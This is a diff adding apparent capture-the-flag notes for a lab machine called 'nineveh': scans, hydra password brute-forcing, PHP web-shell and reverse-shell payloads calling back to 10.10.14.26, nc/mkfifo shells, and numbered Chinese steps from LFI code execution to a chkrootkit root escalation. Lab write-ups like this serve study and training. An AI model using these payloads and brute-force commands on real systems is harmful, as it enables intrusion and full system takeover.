@@ -1,0 +1,45 @@
+nmap  10.129.97.119 -Pn > nmap.txt
+nmap  -sC -sV 10.129.97.119 > nmap.txt
+gobuster dir  -u http://10.129.97.119/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+gobuster dir -k  -u https://10.129.97.119/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,py,cgi > gobusters.txt
+
+
+
+
+
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.129.96.203 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.129.96.203 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
+
+password=fghgfh&remember=yes&login=Log+In&proc_login=true
+
+
+
+<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.26/4444 0>&1\'");?>
+<?php echo system($_REQUEST["cmd"]); ?>
+/bin/bash -i >& /dev/tcp/10.10.14.26/4445 0>&1
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4445 >/tmp/f
+rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.26 4445 >/tmp/g
+
+
+chkrootkit
+
+
+binwalk nineveh.png
+binwalk -Me nineveh.png
+
+
+for i in 571 290 911;do nmap -Pn -p $i --host-timeout 201 --max-retries 0  10.129.97.119;done
+ssh -i _nineveh.png.extracted/secret/nineveh.priv amrios@10.129.97.119
+
+
+1.gobuster找到http端口的department及https的db
+2.這兩個登入頁面都使用hydra可以暴力破解出密碼
+3.在db phpliteadmin創建立nineveh.php數據庫,表明隨便,字段屬性為text,默認內容為<?php echo system($_REQUEST['cmd']); ?>
+4.在department上的LFI漏洞輸入網址可以執行到nineveh.php,透過burp將get請求轉為post,調整請求地址後能實現remote code execution
+5.得到www-data用戶後可在/etc下發現report文件夾,底下可查看到log發現有起chkrootkit服務
+6.根據chkrootkit服務漏洞在/tmp下創建update可以root執行該文件
+7.update內容須更改/tmp/f成/tmp/g,否則會與user衝突
+8.update必須也給予執行權限 chmod +x
+9.
